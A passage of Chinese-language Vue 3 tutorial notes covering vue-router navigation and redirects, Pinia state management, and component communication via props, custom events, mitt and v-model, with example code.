replace属性】</h2><ol><li><p>作用：控制路由跳转时操作浏览器历史记录的模式。</p></li><li><p>浏览器的历史记录有两种写入方式：分别为<code>push</code>和<code>replace</code>：</p><ul><li><code>push</code>是追加历史记录（默认值）。</li><li><code>replace</code>是替换当前记录。</li></ul></li><li><p>开启<code>replace</code>模式：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;RouterLink replace .......&gt;News&lt;/RouterLink&gt;</span><br></pre></td></tr></table></figure></li></ol><h2 id="4-11-【编程式导航】"><a href="#4-11-【编程式导航】" class="headerlink" title="4.11. 【编程式导航】"></a>4.11. 【编程式导航】</h2><p>路由组件的两个重要的属性：<code>$route</code>和<code>$router</code>变成了两个<code>hooks</code></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123;useRoute,useRouter&#125; <span class="keyword">from</span> <span class="string">&#x27;vue-router&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> route = <span class="title function_">useRoute</span>()</span><br><span class="line"><span class="keyword">const</span> router = <span class="title function_">useRouter</span>()</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(route.<span class="property">query</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(route.<span class="property">parmas</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(router.<span class="property">push</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(router.<span class="property">replace</span>)</span><br></pre></td></tr></table></figure><h2 id="4-12-【重定向】"><a href="#4-12-【重定向】" class="headerlink" title="4.12. 【重定向】"></a>4.12. 【重定向】</h2><ol><li><p>作用：将特定的路径，重新定向到已有路由。</p></li><li><p>具体编码：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">path</span>:<span class="string">&#x27;/&#x27;</span>,</span><br><span class="line">    <span class="attr">redirect</span>:<span class="string">&#x27;/about&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h1 id="5-pinia"><a href="#5-pinia" class="headerlink" title="5. pinia"></a>5. pinia</h1><h2 id="5-1【准备一个效果】"><a href="#5-1【准备一个效果】" class="headerlink" title="5.1【准备一个效果】"></a>5.1【准备一个效果】</h2><img src="./images/pinia_example.gif" alt="pinia_example" style="zoom:30%;border:3px solid" /> <h2 id="5-2【搭建-pinia-环境】"><a href="#5-2【搭建-pinia-环境】" class="headerlink" title="5.2【搭建 pinia 环境】"></a>5.2【搭建 pinia 环境】</h2><p>第一步：<code>npm install pinia</code></p><p>第二步：操作<code>src/main.ts</code></p><figure class="highlight ts"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; createApp &#125; <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">App</span> <span class="keyword">from</span> <span class="string">&#x27;./App.vue&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 引入createPinia，用于创建pinia */</span></span><br><span class="line"><span class="keyword">import</span> &#123; createPinia &#125; <span class="keyword">from</span> <span class="string">&#x27;pinia&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 创建pinia */</span></span><br><span class="line"><span class="keyword">const</span> pinia = <span class="title function_">createPinia</span>()</span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">createApp</span>(<span class="title class_">App</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 使用插件 */</span>&#123;&#125;</span><br><span class="line">app.<span class="title function_">use</span>(pinia)</span><br><span class="line">app.<span class="title function_">mount</span>(<span class="string">&#x27;#app&#x27;</span>)</span><br></pre></td></tr></table></figure><p>此时开发者工具中已经有了<code>pinia</code>选项</p><img src="https://cdn.nlark.com/yuque/0/2023/png/35780599/1684309952481-c67f67f9-d1a3-4d69-8bd6-2b381e003f31.png" style="zoom:80%;border:1px solid black;border-radius:10px" /><h2 id="5-3【存储-读取数据】"><a href="#5-3【存储-读取数据】" class="headerlink" title="5.3【存储+读取数据】"></a>5.3【存储+读取数据】</h2><ol><li><p><code>Store</code>是一个保存：<strong>状态</strong>、<strong>业务逻辑</strong> 的实体，每个组件都可以<strong>读取</strong>、<strong>写入</strong>它。</p></li><li><p>它有三个概念：<code>state</code>、<code>getter</code>、<code>action</code>，相当于组件中的： <code>data</code>、 <code>computed</code> 和 <code>methods</code>。</p></li><li><p>具体编码：<code>src/store/count.ts</code></p><figure class="highlight ts"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 引入defineStore用于创建store</span></span><br><span class="line"><span class="keyword">import</span> &#123;defineStore&#125; <span class="keyword">from</span> <span class="string">&#x27;pinia&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义并暴露一个store</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> useCountStore = <span class="title function_">defineStore</span>(<span class="string">&#x27;count&#x27;</span>,&#123;</span><br><span class="line">  <span class="comment">// 动作</span></span><br><span class="line">  <span class="attr">actions</span>:&#123;&#125;,</span><br><span class="line">  <span class="comment">// 状态</span></span><br><span class="line">  <span class="title function_">state</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">      <span class="attr">sum</span>:<span class="number">6</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="comment">// 计算</span></span><br><span class="line">  <span class="attr">getters</span>:&#123;&#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li><li><p>具体编码：<code>src/store/talk.ts</code></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 引入defineStore用于创建store</span></span><br><span class="line"><span class="keyword">import</span> &#123;defineStore&#125; <span class="keyword">from</span> <span class="string">&#x27;pinia&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义并暴露一个store</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> useTalkStore = <span class="title function_">defineStore</span>(<span class="string">&#x27;talk&#x27;</span>,&#123;</span><br><span class="line">  <span class="comment">// 动作</span></span><br><span class="line">  <span class="attr">actions</span>:&#123;&#125;,</span><br><span class="line">  <span class="comment">// 状态</span></span><br><span class="line">  <span class="title function_">state</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">      <span class="attr">talkList</span>:[</span><br><span class="line">        &#123;<span class="attr">id</span>:<span class="string">&#x27;yuysada01&#x27;</span>,<span class="attr">content</span>:<span class="string">&#x27;你今天有点怪，哪里怪？怪好看的！&#x27;</span>&#125;,</span><br><span class="line">     &#123;<span class="attr">id</span>:<span class="string">&#x27;yuysada02&#x27;</span>,<span class="attr">content</span>:<span class="string">&#x27;草莓、蓝莓、蔓越莓，你想我了没？&#x27;</span>&#125;,</span><br><span class="line">        &#123;<span class="attr">id</span>:<span class="string">&#x27;yuysada03&#x27;</span>,<span class="attr">content</span>:<span class="string">&#x27;心里给你留了一块地，我的死心塌地&#x27;</span>&#125;</span><br><span class="line">      ]</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="comment">// 计算</span></span><br><span class="line">  <span class="attr">getters</span>:&#123;&#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li><li><p>组件中使用<code>state</code>中的数据</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;h2&gt;当前求和为：&#123;&#123; sumStore.sum &#125;&#125;&lt;/h2&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script setup lang=&quot;ts&quot; name=&quot;Count&quot;&gt;</span><br><span class="line">  // 引入对应的useXxxxxStore</span><br><span class="line">  import &#123;useSumStore&#125; from &#x27;@/store/sum&#x27;</span><br><span class="line">  </span><br><span class="line">  // 调用useXxxxxStore得到对应的store</span><br><span class="line">  const sumStore = useSumStore()</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">&lt;ul&gt;</span><br><span class="line">    &lt;li v-for=&quot;talk in talkStore.talkList&quot; :key=&quot;talk.id&quot;&gt;</span><br><span class="line">      &#123;&#123; talk.content &#125;&#125;</span><br><span class="line">    &lt;/li&gt;</span><br><span class="line">  &lt;/ul&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script setup lang=&quot;ts&quot; name=&quot;Count&quot;&gt;</span><br><span class="line">  import axios from &#x27;axios&#x27;</span><br><span class="line">  import &#123;useTalkStore&#125; from &#x27;@/store/talk&#x27;</span><br><span class="line"></span><br><span class="line">  const talkStore = useTalkStore()</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></li></ol><h2 id="5-4-【修改数据】-三种方式"><a href="#5-4-【修改数据】-三种方式" class="headerlink" title="5.4.【修改数据】(三种方式)"></a>5.4.【修改数据】(三种方式)</h2><ol><li><p>第一种修改方式，直接修改</p><figure class="highlight ts"><table><tr><td class="code"><pre><span class="line">countStore.<span class="property">sum</span> = <span class="number">666</span></span><br></pre></td></tr></table></figure></li><li><p>第二种修改方式：批量修改</p><figure class="highlight ts"><table><tr><td class="code"><pre><span class="line">countStore.$patch(&#123;</span><br><span class="line">  <span class="attr">sum</span>:<span class="number">999</span>,</span><br><span class="line">  <span class="attr">school</span>:<span class="string">&#x27;atguigu&#x27;</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li><li><p>第三种修改方式：借助<code>action</code>修改（<code>action</code>中可以编写一些业务逻辑）</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; defineStore &#125; <span class="keyword">from</span> <span class="string">&#x27;pinia&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> useCountStore = <span class="title function_">defineStore</span>(<span class="string">&#x27;count&#x27;</span>, &#123;</span><br><span class="line">  <span class="comment">/*************/</span></span><br><span class="line">  <span class="attr">actions</span>: &#123;</span><br><span class="line">    <span class="comment">//加</span></span><br><span class="line">    <span class="title function_">increment</span>(<span class="params">value:number</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">sum</span> &lt; <span class="number">10</span>) &#123;</span><br><span class="line">        <span class="comment">//操作countStore中的sum</span></span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">sum</span> += value</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="comment">//减</span></span><br><span class="line">    <span class="title function_">decrement</span>(<span class="params">value:number</span>)&#123;</span><br><span class="line">      <span class="keyword">if</span>(<span class="variable language_">this</span>.<span class="property">sum</span> &gt; <span class="number">1</span>)&#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">sum</span> -= value</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="comment">/*************/</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li><li><p>组件中调用<code>action</code>即可</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 使用countStore</span></span><br><span class="line"><span class="keyword">const</span> countStore = <span class="title function_">useCountStore</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 调用对应action</span></span><br><span class="line">countStore.<span class="title function_">incrementOdd</span>(n.<span class="property">value</span>)</span><br></pre></td></tr></table></figure></li></ol><h2 id="5-5-【storeToRefs】"><a href="#5-5-【storeToRefs】" class="headerlink" title="5.5.【storeToRefs】"></a>5.5.【storeToRefs】</h2><ul><li>借助<code>storeToRefs</code>将<code>store</code>中的数据转为<code>ref</code>对象，方便在模板中使用。</li><li>注意：<code>pinia</code>提供的<code>storeToRefs</code>只会将数据做转换，而<code>Vue</code>的<code>toRefs</code>会转换<code>store</code>中数据。</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">&lt;div class=&quot;count&quot;&gt;</span><br><span class="line">&lt;h2&gt;当前求和为：&#123;&#123;sum&#125;&#125;&lt;/h2&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script setup lang=&quot;ts&quot; name=&quot;Count&quot;&gt;</span><br><span class="line">  import &#123; useCountStore &#125; from &#x27;@/store/count&#x27;</span><br><span class="line">  /* 引入storeToRefs */</span><br><span class="line">  import &#123; storeToRefs &#125; from &#x27;pinia&#x27;</span><br><span class="line"></span><br><span class="line">/* 得到countStore */</span><br><span class="line">  const countStore = useCountStore()</span><br><span class="line">  /* 使用storeToRefs转换countStore，随后解构 */</span><br><span class="line">  const &#123;sum&#125; = storeToRefs(countStore)</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="5-6-【getters】"><a href="#5-6-【getters】" class="headerlink" title="5.6.【getters】"></a>5.6.【getters】</h2><ol><li><p>概念：当<code>state</code>中的数据，需要经过处理后再使用时，可以使用<code>getters</code>配置。</p></li><li><p>追加<code>getters</code>配置。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 引入defineStore用于创建store</span></span><br><span class="line"><span class="keyword">import</span> &#123;defineStore&#125; <span class="keyword">from</span> <span class="string">&#x27;pinia&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义并暴露一个store</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> useCountStore = <span class="title function_">defineStore</span>(<span class="string">&#x27;count&#x27;</span>,&#123;</span><br><span class="line">  <span class="comment">// 动作</span></span><br><span class="line">  <span class="attr">actions</span>:&#123;</span><br><span class="line">    <span class="comment">/************/</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="comment">// 状态</span></span><br><span class="line">  <span class="title function_">state</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">      <span class="attr">sum</span>:<span class="number">1</span>,</span><br><span class="line">      <span class="attr">school</span>:<span class="string">&#x27;atguigu&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="comment">// 计算</span></span><br><span class="line">  <span class="attr">getters</span>:&#123;</span><br><span class="line">    <span class="attr">bigSum</span>:(state):<span class="function"><span class="params">number</span> =&gt;</span> state.<span class="property">sum</span> *<span class="number">10</span>,</span><br><span class="line">    <span class="title function_">upperSchool</span>():string&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="variable language_">this</span>. school.<span class="title function_">toUpperCase</span>()</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li><li><p>组件中读取数据：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123;increment,decrement&#125; = countStore</span><br><span class="line"><span class="keyword">let</span> &#123;sum,school,bigSum,upperSchool&#125; = <span class="title function_">storeToRefs</span>(countStore)</span><br></pre></td></tr></table></figure></li></ol><h2 id="5-7-【-subscribe】"><a href="#5-7-【-subscribe】" class="headerlink" title="5.7.【$subscribe】"></a>5.7.【$subscribe】</h2><p>通过 store 的 <code>$subscribe()</code> 方法侦听 <code>state</code> 及其变化</p><figure class="highlight ts"><table><tr><td class="code"><pre><span class="line">talkStore.$subscribe(<span class="function">(<span class="params">mutate,state</span>)=&gt;</span>&#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;LoveTalk&#x27;</span>,mutate,state)</span><br><span class="line">  <span class="variable language_">localStorage</span>.<span class="title function_">setItem</span>(<span class="string">&#x27;talk&#x27;</span>,<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(talkList.<span class="property">value</span>))</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h2 id="5-8-【store组合式写法】"><a href="#5-8-【store组合式写法】" class="headerlink" title="5.8. 【store组合式写法】"></a>5.8. 【store组合式写法】</h2><figure class="highlight ts"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123;defineStore&#125; <span class="keyword">from</span> <span class="string">&#x27;pinia&#x27;</span></span><br><span class="line"><span class="keyword">import</span> axios <span class="keyword">from</span> <span class="string">&#x27;axios&#x27;</span></span><br><span class="line"><span class="keyword">import</span> &#123;nanoid&#125; <span class="keyword">from</span> <span class="string">&#x27;nanoid&#x27;</span></span><br><span class="line"><span class="keyword">import</span> &#123;reactive&#125; <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> useTalkStore = <span class="title function_">defineStore</span>(<span class="string">&#x27;talk&#x27;</span>,<span class="function">()=&gt;</span>&#123;</span><br><span class="line">  <span class="comment">// talkList就是state</span></span><br><span class="line">  <span class="keyword">const</span> talkList = <span class="title function_">reactive</span>(</span><br><span class="line">    <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="variable language_">localStorage</span>.<span class="title function_">getItem</span>(<span class="string">&#x27;talkList&#x27;</span>) <span class="keyword">as</span> <span class="built_in">string</span>) || []</span><br><span class="line">  )</span><br><span class="line"></span><br><span class="line">  <span class="comment">// getATalk函数相当于action</span></span><br><span class="line">  <span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">getATalk</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="comment">// 发请求，下面这行的写法是：连续解构赋值+重命名</span></span><br><span class="line">    <span class="keyword">let</span> &#123;<span class="attr">data</span>:&#123;<span class="attr">content</span>:title&#125;&#125; = <span class="keyword">await</span> axios.<span class="title function_">get</span>(<span class="string">&#x27;https://api.uomg.com/api/rand.qinghua?format=json&#x27;</span>)</span><br><span class="line">    <span class="comment">// 把请求回来的字符串，包装成一个对象</span></span><br><span class="line">    <span class="keyword">let</span> obj = &#123;<span class="attr">id</span>:<span class="title function_">nanoid</span>(),title&#125;</span><br><span class="line">    <span class="comment">// 放到数组中</span></span><br><span class="line">    talkList.<span class="title function_">unshift</span>(obj)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> &#123;talkList,getATalk&#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h1 id="6-组件通信"><a href="#6-组件通信" class="headerlink" title="6. 组件通信"></a>6. 组件通信</h1><p><strong><code>Vue3</code>组件通信和<code>Vue2</code>的区别：</strong></p><ul><li>移出事件总线，使用<code>mitt</code>代替。</li></ul><ul><li><code>vuex</code>换成了<code>pinia</code>。</li><li>把<code>.sync</code>优化到了<code>v-model</code>里面了。</li><li>把<code>$listeners</code>所有的东西，合并到<code>$attrs</code>中了。</li><li><code>$children</code>被砍掉了。</li></ul><p><strong>常见搭配形式：</strong></p><img src="images/image-20231119185900990.png" alt="image-20231119185900990" style="zoom:60%;" /> <h2 id="6-1-【props】"><a href="#6-1-【props】" class="headerlink" title="6.1. 【props】"></a>6.1. 【props】</h2><p>概述：<code>props</code>是使用频率最高的一种通信方式，常用与 ：<strong>父 ↔ 子</strong>。</p><ul><li>若 <strong>父传子</strong>：属性值是<strong>非函数</strong>。</li><li>若 <strong>子传父</strong>：属性值是<strong>函数</strong>。</li></ul><p>父组件：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class=&quot;father&quot;&gt;</span><br><span class="line">    &lt;h3&gt;父组件，&lt;/h3&gt;</span><br><span class="line">&lt;h4&gt;我的车：&#123;&#123; car &#125;&#125;&lt;/h4&gt;</span><br><span class="line">&lt;h4&gt;儿子给的玩具：&#123;&#123; toy &#125;&#125;&lt;/h4&gt;</span><br><span class="line">&lt;Child :car=&quot;car&quot; :getToy=&quot;getToy&quot;/&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script setup lang=&quot;ts&quot; name=&quot;Father&quot;&gt;</span><br><span class="line">import Child from &#x27;./Child.vue&#x27;</span><br><span class="line">import &#123; ref &#125; from &quot;vue&quot;;</span><br><span class="line">// 数据</span><br><span class="line">const car = ref(&#x27;奔驰&#x27;)</span><br><span class="line">const toy = ref()</span><br><span class="line">// 方法</span><br><span class="line">function getToy(value:string)&#123;</span><br><span class="line">toy.value = value</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>子组件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class=&quot;child&quot;&gt;</span><br><span class="line">    &lt;h3&gt;子组件&lt;/h3&gt;</span><br><span class="line">&lt;h4&gt;我的玩具：&#123;&#123; toy &#125;&#125;&lt;/h4&gt;</span><br><span class="line">&lt;h4&gt;父给我的车：&#123;&#123; car &#125;&#125;&lt;/h4&gt;</span><br><span class="line">&lt;button @click=&quot;getToy(toy)&quot;&gt;玩具给父亲&lt;/button&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script setup lang=&quot;ts&quot; name=&quot;Child&quot;&gt;</span><br><span class="line">import &#123; ref &#125; from &quot;vue&quot;;</span><br><span class="line">const toy = ref(&#x27;奥特曼&#x27;)</span><br><span class="line"></span><br><span class="line">defineProps([&#x27;car&#x27;,&#x27;getToy&#x27;])</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h2 id="6-2-【自定义事件】"><a href="#6-2-【自定义事件】" class="headerlink" title="6.2. 【自定义事件】"></a>6.2. 【自定义事件】</h2><ol><li>概述：自定义事件常用于：<strong>子 =&gt; 父。</strong></li><li>注意区分好：原生事件、自定义事件。</li></ol><ul><li>原生事件：<ul><li>事件名是特定的（<code>click</code>、<code>mosueenter</code>等等）    </li><li>事件对象<code>$event</code>: 是包含事件相关信息的对象（<code>pageX</code>、<code>pageY</code>、<code>target</code>、<code>keyCode</code>）</li></ul></li><li>自定义事件：<ul><li>事件名是任意名称</li><li><strong style="color:red">事件对象<code>$event</code>: 是调用<code>emit</code>时所提供的数据，可以是任意类型！！！</strong ></li></ul></li></ul><ol start="3"><li><p>示例：</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--在父组件中，给子组件绑定自定义事件：--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Child</span> @<span class="attr">send-toy</span>=<span class="string">&quot;toy = $event&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--注意区分原生事件与自定义事件中的$event--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;toy = $event&quot;</span>&gt;</span>测试<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//子组件中，触发事件：</span></span><br><span class="line"><span class="variable language_">this</span>.$emit(<span class="string">&#x27;send-toy&#x27;</span>, 具体数据)</span><br></pre></td></tr></table></figure></li></ol><h2 id="6-3-【mitt】"><a href="#6-3-【mitt】" class="headerlink" title="6.3. 【mitt】"></a>6.3. 【mitt】</h2><p>概述：与消息订阅与发布（<code>pubsub</code>）功能类似，可以实现任意组件间通信。</p><p>安装<code>mitt</code></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm i mitt</span><br></pre></td></tr></table></figure><p>新建文件：<code>src\utils\emitter.ts</code></p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 引入mitt </span></span><br><span class="line"><span class="keyword">import</span> mitt <span class="keyword">from</span> <span class="string">&quot;mitt&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建emitter</span></span><br><span class="line"><span class="keyword">const</span> emitter = <span class="title function_">mitt</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  // 绑定事件</span></span><br><span class="line"><span class="comment">  emitter.on(&#x27;abc&#x27;,(value)=&gt;&#123;</span></span><br><span class="line"><span class="comment">    console.log(&#x27;abc事件被触发&#x27;,value)</span></span><br><span class="line"><span class="comment">  &#125;)</span></span><br><span class="line"><span class="comment">  emitter.on(&#x27;xyz&#x27;,(value)=&gt;&#123;</span></span><br><span class="line"><span class="comment">    console.log(&#x27;xyz事件被触发&#x27;,value)</span></span><br><span class="line"><span class="comment">  &#125;)</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  setInterval(() =&gt; &#123;</span></span><br><span class="line"><span class="comment">    // 触发事件</span></span><br><span class="line"><span class="comment">    emitter.emit(&#x27;abc&#x27;,666)</span></span><br><span class="line"><span class="comment">    emitter.emit(&#x27;xyz&#x27;,777)</span></span><br><span class="line"><span class="comment">  &#125;, 1000);</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  setTimeout(() =&gt; &#123;</span></span><br><span class="line"><span class="comment">    // 清理事件</span></span><br><span class="line"><span class="comment">    emitter.all.clear()</span></span><br><span class="line"><span class="comment">  &#125;, 3000); </span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建并暴露mitt</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> emitter</span><br></pre></td></tr></table></figure><p>接收数据的组件中：绑定事件、同时在销毁前解绑事件：</p><figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> emitter <span class="keyword">from</span> <span class="string">&quot;@/utils/emitter&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; onUnmounted &#125; <span class="keyword">from</span> <span class="string">&quot;vue&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 绑定事件</span></span><br><span class="line">emitter.<span class="title function_">on</span>(<span class="string">&#x27;send-toy&#x27;</span>,<span class="function">(<span class="params">value</span>)=&gt;</span>&#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;send-toy事件被触发&#x27;</span>,value)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="title function_">onUnmounted</span>(<span class="function">()=&gt;</span>&#123;</span><br><span class="line">  <span class="comment">// 解绑事件</span></span><br><span class="line">  emitter.<span class="title function_">off</span>(<span class="string">&#x27;send-toy&#x27;</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>【第三步】：提供数据的组件，在合适的时候触发事件</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> emitter <span class="keyword">from</span> <span class="string">&quot;@/utils/emitter&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">sendToy</span>(<span class="params"></span>)&#123;</span><br><span class="line">  <span class="comment">// 触发事件</span></span><br><span class="line">  emitter.<span class="title function_">emit</span>(<span class="string">&#x27;send-toy&#x27;</span>,toy.<span class="property">value</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>注意这个重要的内置关系，总线依赖着这个内置关系</strong></p><h2 id="6-4-【v-model】"><a href="#6-4-【v-model】" class="headerlink" title="6.4.【v-model】"></a>6.4.【v-model】</h2><ol><li><p>概述：实现 <strong>父↔子</strong> 之间相互通信。</p></li><li><p>前序知识 —— <code>v-model</code>的本质</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- 使用v-model指令 --&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; v-model=&quot;userName&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- v-model的本质是下面这行代码 --&gt;</span><br><span class="line">&lt;input </span><br><span class="line">  type=&quot;text&quot; </span><br><span class="line">  :value=&quot;userName&quot; </span><br><span class="line">  @input=&quot;userName =(&lt;HTMLInputElement&gt;$event.target).value&quot;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></li><li><p>组件标签上的<code>v-model</code>的本质：<code>:moldeValue</code> ＋ <code>update:modelValue</code>事件。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- 组件标签上使用v-model指令 --&gt;</span><br><span class="line">&lt;AtguiguInput v-model=&quot;userName&quot;/&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- 组件标签上v-model的本质 --&gt;</span><br><span class="line">&lt;AtguiguInput :modelValue=&quot;userName&quot; @update:model-value=&quot;userName = $event&quot;/&gt;</span><br></pre></td></tr></table></figure><p><code>AtguiguInput</code>组件中：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class=&quot;box&quot;&gt;</span><br><span class="line">    &lt;!--将接收的value值赋给input元素的value属性，目的是：为了呈现数据 --&gt;</span><br><span class="line">&lt;!--给input元素绑定原生input事件，触发input事件时，进而触发update:model-value事件--&gt;</span><br><span class="line">    &lt;input </span><br><span class="line">       type=&quot;text&quot; </span><br><span class="line">       :value=&quot;modelValue&quot; </span><br><span class="line">       @input=&quot;emit(&#x27;update:model-value&#x27;,$event.target.value)&quot;</span><br><span class="line">    &gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script setup lang=&quot;ts&quot; name=&quot;AtguiguInput&quot;&gt;</span><br><span class="line">  // 接收props</span><br><span class="line">  defineProps([&#x27;modelValue&#x27;])</span><br><span class="line">  // 声明事件</span><br><span class="line">  const emit = 